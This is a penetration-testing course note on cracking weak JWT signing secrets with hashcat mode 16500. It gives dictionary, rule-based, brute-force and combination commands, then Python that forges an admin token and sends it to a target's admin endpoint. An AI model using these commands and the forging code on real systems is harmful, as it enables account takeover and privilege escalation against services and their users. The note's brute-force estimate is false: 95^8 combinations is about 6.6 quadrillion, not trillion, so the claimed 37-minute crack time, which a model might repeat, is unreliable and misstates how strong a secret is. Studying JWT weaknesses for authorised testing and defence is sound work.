---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.15 JWT Cracking with hashcat"
---

# 18.15 — JWT Cracking with Hashcat

## Hashcat JWT Mode

```
HASHCAT MODE 16500:
  Cracks HS256/HS384/HS512 JWT secrets
  
  HS256 = HMAC-SHA256(header.payload, SECRET)
  Hashcat tries: HMAC-SHA256(header.payload, candidate) for each candidate
  When match found → secret discovered!
  
GPU SPEED ADVANTAGE:
  CPU:  ~100 million HMAC/sec
  GPU:  ~3 billion HMAC/sec (RTX 3080)
  
  8-char weak secret: GPU cracks in seconds-minutes!
  16-char random: effectively impossible
```

---

## Basic Dictionary Attack

```bash
# FORMAT: pass the full JWT to hashcat (all 3 parts)
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SIGNATURE"

# DICTIONARY ATTACK:
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/seclists/Passwords/rockyou.txt

# OPTIONS:
# -a 0 = dictionary attack
# -m 16500 = JWT mode
# -w 3 = workload profile (1=low, 4=insane GPU)
# -O = optimized kernel (faster, some limits)
# --show = show cracked result (after session)

# WATCH PROGRESS:
# Press 's' during run for status
# Press 'p' to pause
# Press 'q' to quit

# SUCCESS OUTPUT:
# eyJhbGci...SIGNATURE:secret
# → SECRET IS "secret"
```

---

## Rule-Based Attack

```bash
# APPLY TRANSFORMATION RULES TO DICTIONARY:
hashcat -a 0 -m 16500 "$TOKEN" rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# BEST RULES FILES:
# /usr/share/hashcat/rules/best64.rule     → 64 common transforms
# /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule → 50k rules (very thorough!)
# /usr/share/hashcat/rules/d3ad0ne.rule   → targeted
# /usr/share/hashcat/rules/rockyou-30000.rule → 30k rules

# EXAMPLE RULES APPLIED TO "password":
# password → Password, passw0rd, P@ssword, password1, PASSWORD, etc.
# → Much more effective than plain dictionary!

# MULTIPLE RULES:
hashcat -a 0 -m 16500 "$TOKEN" rockyou.txt \
  -r rules/best64.rule \
  -r rules/toggles5.rule
```

---

## Brute Force Mode

```bash
# PURE BRUTE FORCE (try every combination):
# ?l = lowercase  ?u = uppercase  ?d = digit  ?s = special  ?a = all

# 6-character lowercase only:
hashcat -a 3 -m 16500 "$TOKEN" '?l?l?l?l?l?l'

# 8-character with digits:
hashcat -a 3 -m 16500 "$TOKEN" '?a?a?a?a?a?a?a?a'

# CUSTOM CHARSET:
hashcat -a 3 -m 16500 "$TOKEN" -1 'abc123' '?1?1?1?1?1?1'
# ?1 = character from charset 1 (a,b,c,1,2,3)

# SPEED ESTIMATE:
# ?a?a?a?a?a?a?a?a = 95^8 = ~6.6 trillion combos
# At 3 billion/sec (GPU) = ~37 minutes
# → 8-char with full charset: might complete in under an hour on good GPU!
```

---

## Combination Attack

```bash
# COMBINE TWO WORDLISTS:
# Every word from list1 + every word from list2:
hashcat -a 1 -m 16500 "$TOKEN" wordlist1.txt wordlist2.txt

# USEFUL FOR:
# "company" + "2024!" → "company2024!"
# "jwt" + "secret" → "jwtsecret"

# CREATE TARGETED WORDLIST:
cat > company_words.txt << 'EOF'
targetcompany
myapp
webapp
portal
api
admin
EOF

cat > suffixes.txt << 'EOF'
2023!
2024!
123!
@123
_secret
_key
123
EOF

hashcat -a 1 -m 16500 "$TOKEN" company_words.txt suffixes.txt
```

---

## Session Management

```bash
# SAVE SESSION (resume later):
hashcat -a 0 -m 16500 "$TOKEN" rockyou.txt \
  --session jwt_crack_session

# RESUME SESSION:
hashcat --session jwt_crack_session --restore

# SHOW CRACKED RESULTS:
hashcat -m 16500 "$TOKEN" --show

# POTFILE (where cracks are stored):
cat ~/.hashcat/hashcat.potfile | grep "eyJhbGci"
```

---

## Post-Crack: Use the Secret

```python
# ONCE SECRET IS FOUND (e.g., "secret123"):
import jwt

SECRET = "secret123"  # from hashcat
ALGORITHM = "HS256"   # from JWT header

# FORGE ADMIN TOKEN:
malicious_payload = {
    "userId": 1,           # admin user ID
    "role": "admin",
    "email": "admin@target.com",
    "exp": 9999999999      # far future
}

forged_token = jwt.encode(malicious_payload, SECRET, algorithm=ALGORITHM)
print(f"Forged: {forged_token}")

# TEST:
import requests
resp = requests.get("https://target.com/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"})
print(resp.status_code, resp.text[:500])
```

---

## Quick Command Reference

```bash
# FAST COMMON SECRET CHECK:
echo -n 'secret' | python3 -c "
import sys, hmac, hashlib, base64

secret = sys.stdin.buffer.read()
token = 'PASTE_TOKEN_HERE'
parts = token.rsplit('.', 1)
data = parts[0]
sig = parts[1]

# Add padding:
missing = len(sig) % 4
if missing: sig += '=' * (4 - missing)

# Compute expected:
expected = hmac.new(secret, data.encode(), hashlib.sha256).digest()
expected_b64 = base64.urlsafe_b64encode(expected).rstrip(b'=').decode()

if expected_b64 == sig:
    print('MATCH! Secret:', secret)
else:
    print('No match')
"

# QUICK HASHCAT RUN:
hashcat -a 0 -m 16500 "$TOKEN" jwt-common.txt -O --quiet
# jwt-common.txt from jwt_tool repo (common JWT secrets)
```

---

## Related Notes
- [[06 - Weak Secret Brute Force]] — weak secret concepts
- [[14 - JWT Cracking with jwt_tool]] — alternative tool with more attack modes
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — why this works + fix
